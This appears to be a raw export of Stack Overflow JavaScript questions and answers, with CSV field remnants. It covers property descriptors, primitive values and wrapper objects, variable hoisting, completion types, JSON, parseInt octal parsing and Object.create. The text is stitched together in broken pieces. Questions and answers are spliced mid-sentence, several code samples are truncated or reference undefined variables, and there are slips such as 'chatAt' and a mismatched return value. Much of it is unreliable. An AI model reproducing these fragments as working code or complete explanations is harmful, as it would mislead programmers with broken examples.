<p>In the property descriptor -<code>{ value: 'bar' }</code>- we can specify property attributes, in the case of <em>Value Properties</em> as in the above example, we can specify the <code>writable</code> attribute, and the common <code>configurable</code> attribute (determines if a property can be re-configured -attribute changes- or deleted.</p>

<p>And we have also the <code>enumerable</code> attribute, which determines if the property will be enumerated by the <code>for-in</code> statement.</p>

<p>If we don't specify the attributes, they are <code>false</code> by default, the descriptor will look like: </p>

<pre><code>{
  value: 'bar',
  writable: false,
  configurable: false,
  enumerable: false
}
</code></pre>

<p>Basically the question is: How can I deal with the grabHistory (array object ?) in jQuery?</p>

<p>I'm grateful for every advice.</p>
","5445","","<p>The line that confuses you more, is actually using <code>$A</code> where isn't needed, it can be removed safely:</p>

<pre><code>this.grabHistory = [event];
</code></pre>

<p><code>$A</code> is a helper function to produce a <em>real array</em> from an array-like object such a <code>DOMCollection</code>, or an <code>arguments</code> object for example.</p>

<p>The expression <code>$A([event])</code> is simply redundant, since you are actually constructing a <em>real array</em>, which has one element, the <code>event</code> object -the literal <code>[event]</code> does that-.</p>

<p>The term <em>array-like</em> means an object that contains numeric properties and a <code>length</code> property, but is not really an array - it doesn't inherit the methods from <code>Array.prototype</code> -.</p>

<p>Anyway, the implementation of the <code>$A</code> function is quite simple (you can see the actual PrototypeJS implementation <a href=""http://github.com/sstephenson/prototype/blob/master/src/lang/array.js#L60"" rel=""nofollow"">here</a>):</p>

<pre><code>function toArray(obj) {
  var array = [];
  // iterate backwards ensuring that length is an UInt32

    array[i] = obj[i];

","5445","","<p>It's a widely used pattern that allows you to have a local scope to declare all your variables, without pollute the global scope.</p>

<p>Is simply a FunctionExpression being immediately invoked, the <code>window</code> argument is used mostly to shorten the <em>identifier lookup</em> to the local scope.</p>

<p>In the browser environment <code>window</code> is a property of the global object, that points to the global object itself, if it exists on the local scope, resolving will be faster.</p>

<p>About the <code>undefined</code> argument, it is used to ensure that you can use it without worries, in some implementations (in fact all ECMAScript 3 based implementations) the <code>undefined</code> global property ( <code>window.undefined</code> ) is mutable, meaning that someone can change its value to e.g.: </p>

<p>What is going on here that an <code>string</code> is not an <code>object</code>? Am i confusing javascript with some other languages, where everything is an object?</p>
","5445","","<p><em>""Everything is an object""</em>... that's one of the big misconceptions that exist all around the language.</p>

<p><strong>Not</strong> <em>everything</em> is an object, there are what we call <em>primitive values</em>, which are string, number, boolean, null, and undefined.</p>

<p>That's true, a string is a <strong>primitive value</strong>, but you can access all the methods inherited from <code>String.prototype</code> as if it were an object.</p>

<p>The property <a href=""http://ecma262-5.com/ELS5_HTML.htm#Section_11.2.1"">accessor operators</a> (the dot and the bracket notation), temporarily convert the string value to a String object, for being able to access those methods, e.g.:</p>

<pre><code>""ab"".charAt(1); // ""b""
</code></pre>

<p>What happens behind the scenes is something like this:</p>

<pre><code>new String(""ab"").charAt(1); // ""b"", temporal conversion ToObject
</code></pre>

<p>As with the other primitive values, such as <code>Boolean</code>, and <code>Number</code>, there are <em>object wrappers</em>, which are simply objects that contain the primitive value, as in your example:</p>

<pre><code>var strObj = new String("""");
strObj.prop = ""foo"";

typeof strObj; // ""object""
typeof strObj.prop; // ""string""
</code></pre>

<p>While with a primitive:</p>

<pre><code>var strValue = """";
strValue.prop = ""foo"";

typeof strValue; // ""string""
typeof strValue.prop; // ""undefined""
</code></pre>

<p>And this happens because again, the property accessor on the second line above, creates a new temporal object, as:</p>

<pre><code>var strValue = """";
new String(strValue).prop = ""foo""; // a new object which is discarded
//...

<p>I understand that <code>![]</code> is evaluated to <code>false</code> or <code>0</code> and so on, but how does it execute? And how can I convert this to something humans can understand and not only Jon Skeet?</p>

<p>Can someone break some piece of this code and explain me what's happening?</p>
","5445","","<p>Well, evaluating the expression in parts, at the end it is equivalent to:</p>

<pre><code>[]['sort']['call']()[""btoa""](""00"")[1]; // ""D""
</code></pre>

<p>Which can be simplified to :</p>

<pre><code>btoa(""00"")[1]; // ""D""
</code></pre>

<p>How you can ""decode it""?</p>

<p>Simply examine the operators used, for example, we can see at first that an array literal is used, then several <em>bracket notation</em> property accesses are done, and a couple of invocations.</p>

<p>How does it work?</p>

<p>The trick is to chain multiple type conversions, for example, to get the <code>f</code> letter:</p>

<pre><code>(![]+[])[+[]]
</code></pre>

<p>If we examine the first part, in parentheses, <code>![]+[]</code>, we see a boolean negation, which will return <code>false</code> because an array object is always truthy, and then a <em>concatenation</em>.</p>

<p>That produces the string <code>""false""</code>, then, the second part, we see a brackets applied to that string, to access a character, and the expression <code>+[]</code>, which results in <code>0</code>.</p>

<p><code>+[]</code> gives zero because the Array's <code>toString</code> method returns an empty string, for an empty array like that one, and an empty string produces to zero when it is converted to number (the unary <code>+</code> operator in this example).</p>

<p>There are just tricks like that, things that produce a string, such <code>""true""</code>, <code>""false""</code>, <code>""null""</code>, <code>""undefined""</code>, etc... and more tricks to get the numerically.</p>

<p>For example to get a number -to access a character-, they use again cryptic type conversion:</p>

<pre><code>+[];            // 0, equivalent to +""""
+!+[];          // 1, equivalent to +true
!+[]+!+[];      // 2, equivalent to +true+true
!+[]+!+[]+!+[]; // 3, equivalent to +true+true+true

"<p>I am really confused as to why sometimes vars will not work when ""var"" is declared in front of them when used in a namespaced object. Isn't adding ""var"" in front of every variable the correct thing to do to keep it outside the global namespace?</p>

<p>Or would creating any var without declaring ""var"" first in my namespaced object, ensure of this, so I don't eed to worry about ""var""?</p>

<p>Here's an example of my code:</p>

<pre><code>MYNAME.DoStuff = {
   initialize: function() {
       var var1 = 'name'; //1
       var2 = 'name'; //2

","5445","","<p>The <code>var</code> statement will bind the variable to the scope of the current function, in your example <code>var1</code> is accessible only within <code>initialize</code>.</p>

<p>Your second example, <code>var2 = 'name';</code> is simply an assignment made to a -possibly- <em>undeclared identifier</em>.</p>

<p>This is an <em>anti-pattern</em>, and should be avoided. If the identifier is not resolvable higher in the scope chain, <code>var2</code> will end up being a property of the global object -an implied global, since most of the time you actually try to avoid globals-.</p>

<p>Moreover, the new ECMAScript 5 Strict Mode, completely disallows this kind of assignments, <em>please</em> avoid them...</p>

<p>The third example, <code>this.var3</code> will create a <em>property</em> in the <em>current</em> object, in your example the <code>this</code> value of <code>initialize</code> will refer to <code>MYNAME.DoStuff</code> because you invoke the initialize method by <code>MYNAME.DoStuff.initialize();</code>.</p>

<p>In this third example you can access this kind of properties on your <code>linkStuff</code> function, just by <code>this.var3</code> - if you invoke that <code>linkStuff</code> function properly, e.g. <code>MYNAME.DoStuff.linkStuff();</code>-.</p>

"<p>Javascript has lot's of ""tricks"" around types and type conversions so I'm wondering if these 2 methods are the same or if there is some corner case that makes them different?</p>
","5445","","<p>They are not completely the same, and actually, <a href=""http://bclary.com/2004/11/07/#a-15.5.1"">the String constructor called as a function</a> (your first example), will at the end, call the <code>toString</code> method of the object passed, for example:</p>

<pre><code>var o = { toString: function () { return ""foo""; } };
String(o); // ""foo""
</code></pre>

<p>On the other hand, if an identifier refers to <code>null</code> or <code>undefined</code>, you can't use obviously the <code>toString</code> method, it will give you a <strong><code>TypeError</code> exception</strong>:</p>

<pre><code>var value = null;
String(null); //       ""null""
value.toString(); //   TypeError
</code></pre>

<p>The <code>String</code> constructor called as a function would be roughly equivalent to:</p>

<pre><code>value+'';
</code></pre>

<p>The type conversion rules from <em>Object</em>-to-<em>Primitive</em> are detailed described on the specification, the <a href=""http://bclary.com/2004/11/07/#a-8.6.2.6""><code>[[DefaultValue]]</code></a> internal operation.</p>

<p>In a brief, when converting from <em>Object</em>-to-<em>String</em>, the following steps are taken:</p>

<ol>
<li>If available, execute the <code>toString</code> method.
<ul>
<li>If the <code>result</code> is <em>not a primitive</em>, go to Step 2, else return the <code>result</code></li>
</ul></li>
<li>If available, execute the <code>valueOf</code> method.
<ul>
<li>If the <code>result</code> <em>is a primitive</em>, return <code>result</code>, else Step 3.</li>
</ul></li>
<li>Throw <code>TypeError</code>.</li>
</ol>

<p>Given the above rules, we can make an example of the semantics involved:</p>

<pre><code>var o = {
  toString:function () { return ""foo""; },
  valueOf: function () { return ""bar""; }
};

String(o); // ""foo""

// Make the toString method unavailable:
o.toString =  null;

String(o); // ""bar""

// Now make the valueOf method also unavailable:
o.valueOf = null;

try { 
  String(o); 
} catch (e) {
  alert(e); // TypeError!
}
</code></pre>

<p>If you want to digg-in more in this mechanism I would recommend you to give a look to the <a href=""http://bclary.com/2004/11/07/#a-9.1""><code>ToPrimitive</code></a> and the <a href=""http://bclary.com/2004/11/07/#a-9.8""><code>ToString</code></a> internal operations.</p>

<p>Also I would recommend you this article:</p>

"<p>Using Crockford's method ( <a href=""http://javascript.crockford.com/prototypal.html"" rel=""nofollow"">http://javascript.crockford.com/prototypal.html</a> ) doesn't work when we have reference values in properties (an array in the supertype) as this is common among all the objects.</p>

<p>So, what's really the recommended way to do object inheritance in Javascript that doesn't have problem and that visually encapsulates better all the object's methods and properties?</p>

<p>Example:</p>

<pre><code>if (typeof Object.create !== 'function') {
    Object.create = function (o) {
        function F() {}
        F.prototype = o;
        return new F();
    };
}
var p1 = {name: ""nick"", friends : [""a1"", ""a2""]};
var p2 = Object.create(p1);
p2.name =""john"";
p2.friends.push(""andre"");
alert(p1.friends);
alert(p2.friends);
alert(p1.name);
alert(p2.name);
</code></pre>

<p>The friends array returns the same values for both p1 and p2, while I expect that it returns different values.</p>
","5445","","<p>Well, the members higher in the prototype chain are ""shared"", that's the goal of prototypal inheritance...</p>

<p>However, you can assign an own property to the newly created object (just like you do with the <code>name</code> property, for example:</p>

<pre><code>var foo = {foo: ""xxx"", array : [""a1"", ""a2""]};

var bar = Object.create(foo);
bar.foo = ""yyy"";
bar.array = [""b1"", ""b2""];
bar.array.push(""bar"");

alert(foo.array);   // [""a1"", ""a2""]
alert(bar.array);    // [""b1, ""b2"", ""bar""]
alert(foo.foo);     // ""xxx""
alert(bar.foo);     // ""yyy""
</code></pre>

<p>The <em>standard</em> <code>Object.create</code> method, available on the <a href=""http://kangax.github.com/es5-compat-table/"" rel=""nofollow"">latest browser versions</a>, provides a way to create own properties, using a second argument, for example you could:</p>

<p>Values of the Completion type are triples of the form of <code>(type, value, target)</code>, where:</p>

<ul>
<li><code>type</code> can be <code>normal</code>, <code>break</code>, <code>continue</code>, <code>return</code>, or <code>throw</code>.</li>
<li><code>value</code> can be any language value or <code>empty</code>.</li>
<li><code>target</code> can be any <code>Identifier</code> or <code>empty</code>.</li>
</ul>

<p>In the case of the <code>VariableStatement</code>, the returned completion has no observable effect, it is a <em>normal completion</em>, since the <strong>flow of control</strong> is not modified.</p>

<p>Other <em>statements</em> that return a <em>normal completion</em>, are e.g. an empty <a href=""http://www.ecma262-5.com/ELS5_HTML.htm#Section_12.1"" rel=""nofollow""><code>Block</code> statement</a>, the <a href=""http://www.ecma262-5.com/ELS5_HTML.htm#Section_12.3"" rel=""nofollow"">Empty Statement</a>, the <a href=""http://ecma262-5.com/els5_html.htm#Section_12.4"" rel=""nofollow"">ExpressionStatement</a>, the <a href=""http://www.ecma262-5.com/ELS5_HTML.htm#Section_12.15"" rel=""nofollow""><code>debugger</code> statement</a> (when no debugger attached), etc...</p>

<p>A <a href=""http://ecma262-5.com/els5_html.htm#Section_13"" rel=""nofollow""><code>FunctionDeclaration</code></a> (which is not a statement, but a <a href=""http://ecma262-5.com/els5_html.htm#Section_14"" rel=""nofollow""><code>SourceElement</code></a>) also returns a <code>(normal, empty, empty)</code> completion, thats why for example:</p>

</code></pre>

<p>The <a href=""http://ecma262-5.com/els5_html.htm#Section_15.1.2.1"" rel=""nofollow""><code>eval</code> function</a> after executing the code, examines the completion result, and if the type is <code>normal</code> and the value is <code>empty</code>, it explicitly produces <code>undefined</code> (see step 7 of <a href=""http://ecma262-5.com/els5_html.htm#Section_15.1.2.1"" rel=""nofollow""><code>eval</code></a>), whereas:</p>

<p>If the completion <code>type</code> if other than <code>normal</code> is known also as an ""<strong>abrupt completion</strong>"".</p>

<p>For example:</p>

<pre><code>function foo() {
  return 5;
}
foo();
</code></pre>

<p>The <code>return</code> statement inside <code>foo</code> will produce a completion that looks like <code>(return, 4, empty)</code>.</p>

<p>The <code>target</code> value in the triplet is only used by <code>break</code> and <code>continue</code>, to reference an identifier of a <a href=""http://ecma262-5.com/els5_html.htm#Section_12.12"" rel=""nofollow""><code>LabelledStatement</code></a>, e.g.:</p>

<pre><code>foo: while(true) {
  while(true) {
    break foo;
  }
}
</code></pre>

<p>The completion result of the above <code>break</code> statement would be <code>(break, empty, foo)</code>, since the flow of control is transfered from within the second <code>while</code> to outside, at the level of the <code>foo</code> label.</p>

<p>The variable instantiation process occurs <em>before</em> the actual code execution, at the time the function is executed, those variables will be already bound to the local scope, for example:</p>

<pre><code>function foo () {
  if (false) {
    var test = 'foo'; // never executed
  }
  return test;
}
foo(); // undefined
</code></pre>

<p>When the function is about to be executed, identifiers of formal parameters, identifiers from variable declarations,  and identifiers from function declarations within the function's body are bound to the local variable environment.</p>

<p>Variables are initialized with <code>undefined</code>.</p>

<p>Also, identifiers in the local scope <em>shadow</em> the others with the same name, higher in the scope chain, for example:</p>

<pre><code>var test = 'global';
function bar () {
  alert(test); // undefined, not ""global"", the local variable already declared
  var test = 'xxx';
}
bar();
</code></pre>

<p>If the <code>test</code> variable were not declared anywhere, a <code>ReferenceError</code> will be thrown:</p>

<pre><code>function foo () {
  return test;
}

try {
  foo(); // ReferenceError!!
} catch (e) {
  alert(e);
}
</code></pre>

<p>That's one of the reasons about why for example, JSLint recommends only <a href=""http://www.jslint.com/lint.html#scope"" rel=""nofollow"">one <code>var</code> statement</a> at the top of functions, because for example, the first snippet, will actually resemble this when executed:</p>

<pre><code>function foo () {
  var test; // var statement was ""hoisted""
  if (false) {
    test = 'foo'; // never executed
  }
  return test;
}
foo(); // undefined
</code></pre>

<p>Another reason is because blocks don't introduce a new lexical scope, only functions do it, so having a <code>var</code> statement within a look might make you think that the life of the variable is constrained to that block only, but that's not the case.</p>

<p>Nested function declarations will have a similar behavior of <a href=""http://stackoverflow.com/questions/1710424/referencing-a-javascript-value-before-it-is-declared-can-someone-explain-this/""><em>hoisting</em></a>, they will be declared <em>before</em> the code execution, but they are initialized in that moment also:</p>

<pre><code>function foo () {
  return typeof bar;
  // unreachable code:
  function bar() {
    //..
  }
}
foo(); // ""function""

"<p>I am new to JSON and JavaScript object.</p>

<ul>
<li>Can anyone please explain the differences between JSON and JavaScript object?  </li>
<li>What are their uses?  </li>
<li>Is one better than the other? or it depends on the situation?  </li>
<li>When to use which one, in what situation?  </li>
<li>Why JSON was created in the first  place? What was the main purpose?  </li>
<li>Can someone give examples of when one should use JSON rather JavaScript object and vice versa?</li>
</ul>
","5445","","<p>First you should know what JSON is:</p>

<ul>
<li>It is <em>language agnostic</em> data-interchange format.</li>
</ul>

<p>The syntax of JSON was inspired by the JavaScript Object Literal notation, but there are differences between them.</p>

<p>For example, in JSON all <em>keys</em> must be quoted, while in object literals this is not necessary:</p>

<pre><code>// JSON:
{ ""foo"": ""bar"" }

// Object literal:
var o = { foo: ""bar"" };
</code></pre>

<p>The quotes are mandatory on JSON because in JavaScript (more exactly in ECMAScript 3rd. Edition), the usage of <em>reserved words</em> as property names is disallowed, for example:</p>

<pre><code>var o = { if: ""foo"" }; // SyntaxError in ES3
</code></pre>

<p>While, using a string literal as a property name (quoting the property name) gives no problems:</p>

<pre><code>var o = { ""if"": ""foo"" }; 
</code></pre>

<p>So for <em>""compatibility""</em> (and easy eval'ing maybe?) the quotes are mandatory.</p>

<p>The data types in JSON are also restricted to the following values:</p>

<ul>
<li><code>string</code></li>
<li><code>number</code></li>
<li><code>object</code></li>
<li><code>array</code></li>
<li>A literal as:
<ul>
<li><code>true</code></li>
<li><code>false</code></li>
<li><code>null</code></li>
</ul></li>
</ul>

<p>The grammar of <code>Strings</code> changes, the <em>have</em> be delimited by <em>double quotes</em>, while in JavaScript, you can use single or double quotes interchangeably.</p>

<pre><code>// Invalid JSON:
{ ""foo"": 'bar' }
</code></pre>

<p>The accepted JSON grammar of <code>Numbers</code> also changes, in JavaScript you can use Hexadecimal Literals, for example <code>0xFF</code>, or (the infamous) Octal Literals e.g. <code>010</code>. In JSON you can use only Decimal Literals.</p>

<pre><code>// Invalid JSON:
{ ""foo"": 0xFF }
</code></pre>

<p><sub>There are some buggy implementations (Firefox 3.5+, IE8+, json2.js) where octal literals are wrongly allowed, e.g. <code>JSON.parse('01')</code> should produce a <code>SyntaxError</code>.</sub></p>
"
"<p>Are there any pitfalls to code like this?</p>

<pre><code>var Foo = function() {
    this.bar = function() { return 'bar'; };
};

var f = new Foo();
f[0] = 'hi';
f[1] = 'there';
</code></pre>

<p>Note that I'm creating a new function object with some misc properties, and then I'm treating the object like an array. Also how are the array values being stored in the object? Are 0 and 1 treated like property names?</p>
","5445","","<p>Well, yes, <code>0</code>, and <code>1</code> will be just two property names.</p>

<p>When you assign a property with the bracket notation, the expression between the brackets will be converted to String, and that string will be used as the property name.</p>

<p>In fact, even the <em>indexes</em> for <em>real arrays</em> are just that, properties:</p>

<pre><code>var realArray = ['a'];
realArray.hasOwnProperty('0'); // true
</code></pre>

<p>The difference is that <em>real array</em> objects on every property assignment that correspond to a valid <em>index</em><sup>[1]</sup>, track internally the value of their <code>length</code> property.</p>

<p>That's one of the reasons why ""subclassing"" array objects is difficult, <a href=""http://perfectionkills.com/how-ecmascript-5-still-does-not-allow-to-subclass-an-array/"">even with the new  ECMAScript 5 extensions</a>, or at the moment also with the proposed <a href=""http://gist.github.com/533954"">ECMAScript-Harmony Proxies</a> <sub><a href=""http://stackoverflow.com/questions/2266789/is-there-an-equivalent-of-the-nosuchmethod-feature-for-properties-or-a-way-t/3757676#3757676"">2</a> <a href=""http://wiki.ecmascript.org/doku.php?id=harmony%3aproxies"">3</a></sub>, can't be completely done, in a stanard way.</p>

<p>That can be a problem, depending on how you plan to <em>iterate</em> the numeric properties.</p>

<p>If you enumerate the properties with the <code>for-in</code> statement, other members will appear, not just the numeric properties.</p>

<p><sub>[1] A valid array index is any unsigned 32-bit integer in the range of 0 to (2^32)-1.</sub></p>

"<p>Let's say I have these two functions:</p>

<pre><code>function fnChanger(fn) {
    fn = function() { sys.print('Changed!'); }
}
function foo() {
    sys.print('Unchanged');
}
</code></pre>

<p>Now, if I call <code>foo()</code>, I see <code>Unchanged</code>, as expected. However, if I call <code>fnChanger</code> first, I still see <code>Unchanged</code>:</p>

<pre><code>fnChanger(foo);
foo(); //Unchanged
</code></pre>

<p>Now, I assume this is because <code>foo</code> is not being passed to <code>fnChanger</code> by reference, but I may be wrong.</p>

<p>Why does <code>fnChanger</code> not change <code>foo</code> to print <code>Changed!</code>?<br>
Furthermore, how can I get <code>fnChanger</code> to change <code>foo</code> without too much messy syntax?</p>

<p>PS: I'm using node.js to test all this stuff, so that's where the <code>sys.print</code> comes from.</p>
","5445","","<p>The assignment to the <code>fn</code> argument just makes that identifier to point to the anonymous function, <code>foo</code> in the outer scope is not affected.</p>

<p>When you pass an object as an argument, one can say ""references are passed by value"". The assignment just replaces the location where the <code>fn</code> identifier refers to.</p>

<p>That's how the <a href=""http://en.wikipedia.org/wiki/Evaluation_strategy"" rel=""nofollow""><em>evaluation strategy</em></a> works in JavaScript.</p>

<p>Just before the assignment in the <code>fnChanger</code> functions, the two identifiers, the global <code>foo</code> and the <code>fn</code> argument, point to the same function object:</p>

<pre>
                ---------------------------------------------
    foo ----->  |function foo { sys.print('Un changed!'); } |
                ---------------------------------------------
                   ^
                   |
    fn -------------
</pre>

<p>After the assignment, <code>fn</code> will simply point to the new function:</p>

<pre>
                ---------------------------------------------
    foo ----->  | function foo { sys.print('Unchanged!'); } |
                ---------------------------------------------

                ---------------------------------------
    fn ------>  | function { sys.print('Changed!'); } |
                ---------------------------------------
</pre>

<p>How could you change it?</p>

<p>Well, assuming that <code>foo</code> is a function in the global scope, you could do something like this:</p>

<pre><code>function fnChanger(obj, name) {
    obj[name] = function() { sys.print('Changed!'); };
}

function foo() {
    sys.print('Unchanged');
}

fnChanger(this, 'foo');
foo(); // Changed!
</code></pre>

<p>The above will work because in the <code>fnChanger</code> function, we require a <em>base object</em> and a <em>property name</em>, functions declared in the global execution context are bound as properties of the <em>Global object</em>, therefore we can re-assign its value in that way.</p>

<p>The line <code>fnChanger(this, 'foo');</code> should be executed also in the Global scope, it will pass the <code>this</code> value (which refers to the Global object in this scope) and a property name, allowing you to make an assignment to the <code>GlobalObject.foo</code> identifier.</p>

<p>If that code were inside a function, there is no way we can get a <em>base object</em>, because in this ""Function Code Execution Context"", function declarations (variable declarations and function formal parameters also) are bound as properties of a <em>non-accessible object</em>, called the Variable Object (a chain of these Variable Objects, forms the Scope Chain), and if it were the case, the only workaround would be to use <code>eval</code>.</p>

","5445","","<p>Well, I would say yes, since you are using V8.</p>

<p>What the String contatenation is really doing behind the scenes, is to invoke the <code>Function.prototype.toString</code> method, for example:</p>

<p>Is roughly equivalent to:</p>

<pre><code>var str = f.toString();

<p>This method provides an <em>implementation-dependent</em> string representation of the function, it can vary between implementations, for example whitespace, or optimizations can me done.</p>

<p>But since you are targeting an specific implementations I think you won't have any problem.</p>

<p>If you are getting <code>""[object Function]""</code> it's because (oddly) the <code>Object.prototype.toString</code> is being executed instead the <code>Function.prototype.toString</code> one, e.g.:</p>

<p>In fact, only the first one will be a <strong>variable declaration</strong>, the rest are just assignments to possibly <strong>undeclared identifiers</strong>!</p>

<p>Assigning a value to an undeclared identifier (aka <em>undeclared assignment</em>) is strongly discouraged because, if the identifier is not found on the scope chain, a GLOBAL variable will be created. For example:</p>

<p>Keep in mind that if <code>parseInt</code> detects a leading zero on the string, it will parse the number in octal base, this has changed on ECMAScript 5, the new version of the standard, but it will take a long time to get in browser implementations (it's an incompatibility with ECMAScript 3), also <code>parseInt</code> will ignore trailing characters that don't correspond with any digit of the currently used base.</p>

<p>The <code>Number</code> constructor doesn't detect octals:</p>

<pre><code>Number(""010"");         // 10
parseInt(""010"");       // 8, implicit octal
parseInt(""010"", 10);   // 10, decimal radix used
</code></pre>

<p>But it can handle numbers in hexadecimal notation, just like <code>parseInt</code>:</p>

<pre><code>Number(""0xF"");   // 15
parseInt(""0xF""); //15
</code></pre>

<p>In addition, a widely used construct to perform Numeric type conversion, is the <a href=""http://www.ecma-international.org/publications/files/ECMA-ST/Ecma-262.pdf"">Unary <code>+</code> Operator (p. 72)</a>, it is equivalent to using the <code>Number</code> constructor as a function:</p>

"<p>I'm trying to create an associative array, create an empty array, and then add a (<code>indexName</code> -> value) pair:</p>

","5445","","<p>At first I don't think you need a real array object to do what you need, you can use a plain object.</p>

<p>You can simply use the bracket notation to access a property, using the value of a variable:</p>

<pre><code>var obj = {};
var nume = var1 + var2;
obj[nume] = value;

<p>Array's are simply objects, the concept of an ""associative array"" can be achieved by using a simple object, objects are collections of properties that contain values.</p>

<p>True arrays are useful when you need to store numeric indexes, they automatically update their <code>length</code> property when you assign an index or you <code>push</code> a value to it.</p>

","5445","","<p>Yes, your two examples are ""equivalent"", the <code>&amp;&amp;</code> operator performs <a href=""http://en.wikipedia.org/wiki/Short-circuit_evaluation"" rel=""nofollow"">short-circuit evaluation</a>.</p>

<p>If the first operand expression yields a <em>falsey</em> value (such as <code>null</code>, <code>undefined</code>, <code>0</code>, <code>NaN</code>, an empty string, and of course <code>false</code>), the second operand expression will <em>not</em> be evaluated, and if the value is <em>truthy</em>, the function call will be made.</p>

<p>But if <code>doSomething</code> hasn't been declared, your both examples <em>will fail</em>.</p>

<p>If an identifier that's not declared, is referenced on code, you will get a <code>ReferenceError</code> exception, e.g.:</p>

<p>My questions is no 2, why it returns ""searchRe""? the function name?</p>
","5445","","<p>That happens because you are traversing you array with the <code>for-in</code> statement, and this statement enumerates inherited properties (as your <code>searchRe</code> function).</p>

<p>The purpose of the <code>for-in</code> statement is to <strong>enumerate</strong> object properties, to traverse arrays a sequential loop is always recommended.</p>

<p><sub>...&lt;snip&gt;...</sub></p>

<p><strong>Edit:</strong> Ok, since you are handling other properties than ""array indexes"" in your array objects, you should check that the properties you enumerate are own, <em>non-inherited</em>:</p>

<pre><code>//...
for (var i in this) { // &lt;- notice `var i`, otherwise `i` will be global
  if (this.hasOwnProperty(i)) { // the property physically exist on the object
    //..
  }
}
//..
</code></pre>

<p><strong>Edit 2:</strong> You will have problems detecting when the argument is a RegExp object.</p>

<p>In Chrome, there is a syntax extension that allows you to ""call"" a RegExp object just like it were a function, Firefox allows this also, but in Chrome the real problem is that the <code>typeof</code> operator returns <code>""function""</code> instead the expected <code>""object""</code> result, for example:</p>

<pre><code>var re = /a/;
re('a');   // equivalent to call re.exec('a');

typeof re; // ""function"" on Chrome, ""object"" in other implementations
</code></pre>

<p>So, instead checking:</p>

<pre><code>//..
if (typeof searchStr == 'object') {
  //...
}
//..

<pre><code>if (searchStr &amp;&amp; searchStr.test) {

"<p>By cross-browser feature I mean a feature that is implemented in all of the 5 major browsers. (Beta versions are OK, too)  </p>

","5445","","<p>Something that resembles to your <code>JSON</code> object example are <code>Array.prototype</code> methods.</p>

<li><p>Not throwing on <code>FunctionDeclarations</code> inside blocks, e.g.:</p>

<pre><code> { function foo () {} }
</code></pre>

<p><code>FunctionDeclarations</code> are allowed at the level of <code>Program</code> (global code outside anything) or within the <code>FunctionBody</code> of a function, Blocks can contain only Statements. </p></li>
<li><p>Strings with LineContinuations, e.g.:</p>

<pre><code>var s = 'foo \
bar'; // 'foo bar'
</code></pre></li>
</ul>

<p>Other interesting things exist, like <em>not-quite octal numbers</em>, for example:</p>

<pre><code>var n = 08;

<p>The above <code>NumericLiteral</code> is <em>invalid</em> in any version of the ECMAScript Standard.</p>

<p>The <a href=""http://ecma262-5.com/ELS5_HTML.htm#Section_7.8.3"" rel=""nofollow""><code>DecimalLiteral</code></a> syntax doesn't allows a literal to start with <code>0</code> (with the exception of course of the <code>0</code> literal) and the grammar of <a href=""http://ecma262-5.com/ELS5_HTML.htm#Section_B.1.1"" rel=""nofollow""><code>OctalIntegerLiterals</code></a> is specified to take a zero, and then numbers from 0 to 7 (only <code>0[0-7]+</code>), therefore the literals <code>08</code> or <code>09</code>, <em>should</em> produce a <code>SyntaxError</code></p>

<p>But that doesn't happen in any implementation I've tested ever, they are treated just like DecimalLiteral, (<code>08</code> produces <code>8</code>).</p>

<p>Firefox is the only implementation that will show you a warning:</p>

<p><strong>Edit:</strong> Another widely spread non-standard feature that exist nowadays are <strong>Callable RegExps</strong>.</p>

<p>This feature was introduced by Mozilla, time ago, later cloned by WebKit JSC, V8, and the Opera JS engine.</p>

re.exec('foobar'); // [""foo""]
</code></pre>

<p>This feature is completely non-standard since ES3 and ES5 do not allow <code>[[Call]]</code> to be defined on <code>RegExp</code> instances, because their internal methods and semantics are fully specified.</p>

","5445","","<p>I'm answering this because there is <strong>a lot</strong> of misinformation in the subject:</p>

<blockquote>
  <p>Is that a String or an Object?</p>

<p><strong>No</strong> <code>""cat""</code> is a <strong>primitive String value</strong>:</p>

<p>I will talk later on about types and primitive values.</p>

<blockquote>
  <p>Does it inherits all properties/methods from String or String.prototype?</p>
</blockquote>

<p>Well, when you use the <a href=""http://bclary.com/2004/11/07/#a-11.2.1"">property accessor operator</a> (the dot or the bracket notation), the primitive value is implicitly converted to object, internally, therefore all the methods on <code>String.prototype</code> are available, for example:</p>

<p>When you access:</p>

<pre><code>""cat"".chatAt(0);
</code></pre>

<p>Behind the scenes <code>""cat""</code> is converted to object:</p>

<pre><code>Object(""cat"").chatAt(0);
</code></pre>

<p>That's why you have access to all the inherited properties on values.</p>

<blockquote>
  <p>Why is there a String and String.prototype?</p>
</blockquote>

<p><code>String</code> is a constructor function, allows you to create <em>String objects</em> or do type conversion:</p>

// Type conversion
var myObj = { toString: function () { return ""foo!""; } };

alert(String(myObj)); // ""foo!""
</code></pre>

<p>The <code>String.prototype</code> object, is the object where String object instances inherit from.</p>

<p>I know it's confusing, we have String values and String objects, but most of the time you actually work only with string values, don't worry for now about String objects.</p>

<blockquote>
  <p>Should I call String the String object and String.prototype the String prototype?</p>
</blockquote>

<p>You should call <code>String</code> <a href=""http://bclary.com/2004/11/07/#a-15.5.2"">""The <code>String</code> constructor""</a>.</p>

<p>""String prototype"" is ok.</p>

"<p>I recently stumbled upon the Object.create() method in JavaScript, and am trying to deduce how it is different from creating a new instance of an object with 'new SomeFunction()', and when you would want to use one over the other.</p>

<p>Consider the following example:</p>

<pre><code>var test = {val: 1, func: function(){ return this.val; }};
var testA = Object.create(test);

testA.val = 2;
console.log(test.func()); // 1
console.log(testA.func()); // 2

console.log('other test');
var otherTest = function(){
    this.val = 1;
    this.func = function(){

var otherTestA = new otherTest();

console.log(otherTestB.val); // 2

console.log(otherTestA.func()); // 1
console.log(otherTestB.func()); // 2
</code></pre>

<p>Notice that the same behavior is observed in both cases.  It seems to me that the primary differences between these two scenarios are:</p>

<ul>
<li>The object used in Object.create actually forms the prototype of the new object, where as in the new Function() form the declared properties/functions do not form the prototype.  </li>
<li>You cannot create closures with the Object.create syntax as you would with the functional syntax.  This is logical given the lexical (vs block) type scope of JavaScript.</li>
</ul>

<p>Are the above statements correct? And am I missing something?  When would you use one over the other?  </p>

  <p>The object used in Object.create actually forms the prototype of the new object, where as in the new Function() form the declared properties/functions do not form the prototype.</p>
</blockquote>

<p>Yes, <code>Object.create</code> builds an object that inherits directly from the one passed as its first argument.</p>

<p>With constructor functions, the newly created object inherits from the constructor's prototype, e.g.:</p>

<pre><code>var o = new SomeConstructor();
</code></pre>

<p>In the above example, <code>o</code> inherits directly from <code>SomeConstructor.prototype</code>.</p>

